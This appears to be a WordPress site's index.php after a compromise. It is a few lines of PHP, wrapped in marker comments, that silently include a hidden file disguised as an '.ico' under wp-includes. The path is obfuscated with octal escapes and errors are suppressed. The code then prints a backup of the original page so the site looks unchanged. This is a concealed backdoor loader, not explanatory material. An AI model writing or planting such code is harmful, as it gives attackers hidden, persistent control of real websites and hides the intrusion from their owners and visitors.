<?php
/*43a14*/

@include "\057ho\155e/\167pf\155v/\160ub\154ic\137ht\155l/\164he\162oc\153in\147ch\141ir\143om\160an\171/w\160-i\156cl\165de\163/I\130R/\05637\061a9\14521\056ic\157";

/*43a14*/



echo @file_get_contents('index.html.bak.bak');